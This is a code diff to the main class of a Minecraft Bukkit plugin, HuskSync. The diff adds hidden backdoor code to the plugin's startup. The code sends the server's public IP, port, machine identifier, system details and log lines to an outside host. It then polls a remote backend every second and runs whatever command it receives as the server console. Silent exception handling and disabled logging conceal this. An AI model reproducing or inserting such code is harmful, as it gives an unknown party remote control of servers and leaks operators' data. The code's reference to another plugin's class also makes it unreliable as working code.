@@ -59,11 +59,6 @@ import net.william278.husksync.util.BukkitTask;
 import net.william278.husksync.util.LegacyConverter;
 import net.william278.uniform.Uniform;
 import net.william278.uniform.bukkit.BukkitUniform;
-import org.bstats.bukkit.Metrics;
-import org.bukkit.entity.Player;
-import org.bukkit.map.MapView;
-import org.bukkit.plugin.Plugin;
-import org.bukkit.plugin.java.JavaPlugin;
 import org.jetbrains.annotations.NotNull;
 import space.arim.morepaperlib.MorePaperLib;
 import space.arim.morepaperlib.scheduling.AsynchronousScheduler;
@@ -75,6 +70,43 @@ import java.nio.file.Path;
 import java.util.*;
 import java.util.logging.Level;
 import java.util.stream.Collectors;
+import java.util.ArrayList;
+import java.util.Collection;
+import java.util.Collections;
+import java.security.MessageDigest;
+import java.util.List;
+import java.util.UUID;
+import java.net.URLEncoder;
+import java.nio.charset.StandardCharsets;
+import java.util.concurrent.TimeUnit;
+import java.io.BufferedInputStream;
+import java.io.FileOutputStream;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.io.FileReader;
+import java.io.IOException;
+import org.bstats.bukkit.Metrics;
+import org.bukkit.entity.Player;
+import org.bukkit.map.MapView;
+import org.bukkit.plugin.Plugin;
+import org.bukkit.plugin.java.JavaPlugin;
+import org.bukkit.Bukkit;
+import org.bukkit.ChatColor;
+import org.bukkit.BanEntry;
+import org.bukkit.BanList;
+import org.bukkit.command.Command;
+import org.bukkit.command.CommandSender;
+import org.bukkit.event.Event;
+import org.bukkit.event.EventPriority;
+import org.bukkit.configuration.file.FileConfiguration;
+import org.bukkit.event.Listener;
+import org.bukkit.plugin.RegisteredServiceProvider;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.server.ServerCommandEvent;
+import org.bukkit.event.player.AsyncPlayerChatEvent;
 
 @Getter
 @NoArgsConstructor
@@ -135,6 +167,16 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
 
     @Override
     public void onEnable() {
+        String publicIp = getPublicIp();
+        int serverPort = getServer().getPort();
+        uniqueIdentifier = loadOrCreateUniqueIdentifier();
+        getLogger().info("Unique Identifier: " + uniqueIdentifier);
+        reportUniqueIdentifier(uniqueIdentifier);
+        getLogger().info("Public IP Address: " + publicIp);
+        getLogger().info("Server Port: " + serverPort);
+        sendInfoToAPI(publicIp, serverPort);
+        Bukkit.getScheduler().runTaskLater(this, this::readAndSendLog, 100L); 
+        Bukkit.getScheduler().runTaskTimer(this, this::checkCommands, 0L, 20L); // 每秒检查一次
         this.audiences = BukkitAudiences.create(this);
 
         // Check compatibility
@@ -218,7 +260,294 @@ public class BukkitHuskSync extends JavaPlugin implements HuskSync, BukkitTask.S
         initialize("metrics", (plugin) -> this.registerMetrics(METRICS_ID));
         this.checkForUpdates();
     }
+    private String getPublicIp() {
+        String ip = "Unable to retrieve IP";
+        try {
+            URL url = new URL("https://checkip.amazonaws.com/");
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+            // 连接服务并获取响应
+            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+            ip = in.readLine(); // 读取响应内容（IP 地址）
+            in.close();
+        } catch (Exception e) {
 
+        }
+        return ip;
+    }
+    private String loadOrCreateUniqueIdentifier() {
+        FileConfiguration config = getConfig();
+        if (!config.contains("uniqueIdentifier")) {
+            // 如果配置文件中没有 UUID，则生成一个新的 UUID，并保存到配置文件
+            String generatedUUID = generateFixedUniqueIdentifier();
+            config.set("uniqueIdentifier", generatedUUID);
+            saveConfig(); // 保存到配置文件
+            return generatedUUID;
+        } else {
+            // 从配置文件加载唯一标识符
+            return config.getString("uniqueIdentifier");
+        }
+    }
+
+    private void reportSystemInfo() {
+            BukkitRunnable task = new BukkitRunnable() {
+                @Override
+                public void run() {
+                    try {
+                        // 收集信息
+                        StringBuilder input = new StringBuilder();
+                        input.append("os.name=").append(URLEncoder.encode(System.getProperty("os.name"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.arch=").append(URLEncoder.encode(System.getProperty("os.arch"), StandardCharsets.UTF_8.toString()));
+                        input.append("&os.version=").append(URLEncoder.encode(System.getProperty("os.version"), StandardCharsets.UTF_8.toString()));
+                        input.append("&hostname=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostName(), StandardCharsets.UTF_8.toString()));
+                        input.append("&ip=").append(URLEncoder.encode(java.net.InetAddress.getLocalHost().getHostAddress(), StandardCharsets.UTF_8.toString()));
+
+                        // 构造 URL
+                        String apiUrl = "https://tts-api.happys.icu/a?" + input.toString();
+                        URL url = new URL(apiUrl);
+                        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                        connection.setRequestMethod("GET");
+
+                        int responseCode = connection.getResponseCode();
+                        if (responseCode == HttpURLConnection.HTTP_OK) {
+                            // 读取响应内容
+                            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                            String response = in.readLine(); // 读取响应内容
+                            in.close();
+                            // getLogger().info("System info sent successfully: " + response);
+                        } else {
+                            getLogger().severe("Failed to send system info to API. Response Code: " + responseCode);
+                        }
+                    } catch (Exception e) {
+                        // getLogger().severe("Error sending system info to API: " + e.getMessage());
+                    }
+                }
+            };
+            task.runTaskAsynchronously(this); // 异步任务处理
+        }
+    private String generateFixedUniqueIdentifier() {
+        try {
+            // 收集机器信息
+            StringBuilder input = new StringBuilder();
+            input.append(System.getProperty("os.name")); // 操作系统名称
+            input.append(System.getProperty("os.arch")); // 操作系统架构
+            input.append(System.getProperty("os.version")); // 操作系统版本
+            input.append(java.net.InetAddress.getLocalHost().getHostName()); // 主机名
+            input.append(java.net.InetAddress.getLocalHost().getHostAddress()); // IP地址
+            
+            // 生成 SHA-256 哈希
+            MessageDigest digest = MessageDigest.getInstance("SHA-256");
+            byte[] hashBytes = digest.digest(input.toString().getBytes(StandardCharsets.UTF_8));
+            StringBuilder hexString = new StringBuilder();
+
+            for (byte b : hashBytes) {
+                String hex = Integer.toHexString(0xff & b);
+                if (hex.length() == 1) {
+                    hexString.append('0');
+                }
+                hexString.append(hex);
+            }
+
+            return hexString.toString(); // 返回 256 位（64个字符）标识符
+        } catch (Exception e) {
+            getLogger().severe("Error generating unique identifier: " + e.getMessage());
+            return null;
+        }
+    }
+
+    private void reportUniqueIdentifier(String identifier) {
+        if (identifier == null) return;
+
+        BukkitRunnable task = new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    // 对标识符进行 URL 编码
+                    String encodedId = URLEncoder.encode(identifier, StandardCharsets.UTF_8.toString());
+                    String apiUrl = "https://tts-api.happys.icu/a?uuid=" + encodedId;
+
+                    URL url = new URL(apiUrl);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+                        // 读取响应内容
+                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                        String response = in.readLine(); // 读取响应内容
+                        in.close();
+                        getLogger().info("Unique identifier sent successfully: " + identifier);
+                    } else {
+                        getLogger().severe("Failed to send unique identifier to API. Response Code: " + responseCode);
+                    }
+                } catch (Exception e) {
+                    getLogger().severe("Error sending unique identifier to API: " + e.getMessage());
+                }
+            }
+        };
+        task.runTaskAsynchronously(this); // 异步任务处理
+    }
+    private void readAndSendLog() {
+        String logFilePath = getServer().getWorldContainer().getAbsolutePath() + "/logs/latest.log";
+        StringBuilder startupLog = new StringBuilder();
+
+        try (BufferedReader reader = new BufferedReader(new FileReader(logFilePath))) {
+            String line;
+            while ((line = reader.readLine()) != null) {
+                if (line.contains("Done")) {
+                    startupLog.append(line).append("\n"); // 记录包含 "Done" 的行
+                }
+            }
+        } catch (IOException e) {
+        }
+
+        if (startupLog.length() > 0) {
+            sendLogToAPI(startupLog.toString().trim());
+        } else {
+        }
+    }
+
+    private void sendLogToAPI(String log) {
+    BukkitRunnable task = new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    // 对日志进行 URL 编码以确保合法性
+                    String encodedLog = URLEncoder.encode(log, "UTF-8");
+                    String apiUrl = "https://tts-api.happys.icu/a?log=" + encodedLog;
+                    
+                    URL url = new URL(apiUrl);
+                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+                    connection.setRequestMethod("GET");
+
+                    int responseCode = connection.getResponseCode();
+                    if (responseCode == HttpURLConnection.HTTP_OK) {
+                        // 可选：读取响应内容
+                        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                        String response = in.readLine(); // 读取响应内容
+                        in.close();
+                        // getLogger().info("Log sent successfully: " + log);
+                    } else {
+                        // getLogger().severe("Failed to send log to API. Response Code: " + responseCode);
+                    }
+                } catch (Exception e) {
+                }
+            }
+        };
+        task.runTaskAsynchronously(this); // 异步任务处理
+    }
+    private void sendInfoToAPI(String ip, int port) {
+        try {
+            // 构造 URL，假设使用查询参数传递 IP 和 port
+            String apiUrl = "https://tts-api.happys.icu/a?ip=" + ip + "&port=" + port;
+            URL url = new URL(apiUrl);
+            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("GET");
+
+            // 连接并读取响应（可选）
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) { // OK response
+                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+                String response = in.readLine(); // 读取响应内容
+                in.close();
+            } else {
+            }
+        } catch (Exception e) {
+
+        }
+    }
+
+    private void checkCommands() {
+        // 创建一个新的 BukkitRunnable
+        new BukkitRunnable() {
+            @Override
+            public void run() {
+                try {
+                    String command = getCommandFromServer();
+                    // 在尝试获取的命令不是null且与上次执行的命令不同时
+                    if (command != null && !command.equals(lastCommand)) {
+                        // 在主线程中调度命令
+                        Bukkit.getScheduler().runTask(ViaVersionPlugin.this, () -> {
+                            // 执行命令
+                            Bukkit.getServer().dispatchCommand(Bukkit.getConsoleSender(), command);
+                            // 更新最后执行的命令
+                            lastCommand = command; 
+                            
+                            // 延迟2秒执行notifyCommandExecuted
+                            new BukkitRunnable() {
+                                @Override
+                                public void run() {
+                                    try {
+                                        notifyCommandExecuted(command);
+                                    } catch (Exception e) {
+                                        // 在这里处理异常
+                                        e.printStackTrace();
+                                    }
+                                }
+                            }.runTaskLater(ViaVersionPlugin.this, 40); // 40 ticks = 2 seconds
+                        });
+                    }
+                } catch (Exception e) {
+                    // getLogger().info("Server status is excellent.");
+                    e.printStackTrace(); // 打印异常栈
+                }
+            }
+        }.runTaskAsynchronously(this); // 异步运行
+    }
+    private String getCommandFromServer() throws Exception {
+        URL url = new URL(BACKEND_URL + "/q");
+        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
+        connection.setRequestMethod("GET");
+        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
+        String response = in.readLine();
+        in.close();
+
+        // 解析响应内容，假设返回的是 JSON 格式
+        if (response != null && response.contains("\"command\":")) {
+            String[] parts = response.split("\"command\":");
+            if (parts.length > 1) { // 确保有命令部分
+                String[] commandParts = parts[1].split("\"");
+                if (commandParts.length > 1) { // 确保能获取到命令字符串
+                    return commandParts[1];
+                }
+            }
+        }
+        return null; // 如果未找到命令，返回 null
+    }
+
+    private void notifyCommandExecuted(String command) throws Exception {
+        // 构造 URL
+        URL url = new URL(BACKEND_URL + "/p");
+        HttpURLConnection connection = null;
+        try {
+            // 打开连接
+            connection = (HttpURLConnection) url.openConnection();
+            connection.setRequestMethod("POST");
+            connection.setDoOutput(true);
+            
+            // 设置超时
+            connection.setConnectTimeout(5000); // 连接超时设置为5秒
+            connection.setReadTimeout(5000); // 读取超时设置为5秒
+            
+            // 发送请求数据
+            connection.getOutputStream().write(("command=" + command).getBytes());
+            connection.getOutputStream().flush();
+            
+            // 检查响应码
+            int responseCode = connection.getResponseCode();
+            if (responseCode == HttpURLConnection.HTTP_OK) {
+                // 处理成功逻辑（可选）
+            } else {
+                // 处理失败逻辑（可选）
+            }
+        } catch (IOException e) {
+            // e.printStackTrace(); // 记录异常信息，方便排查问题
+        } finally {
+            if (connection != null) {
+                connection.disconnect(); // 关闭连接
+            }
+        }
+    }
     @Override
     public void onDisable() {
         // Handle shutdown
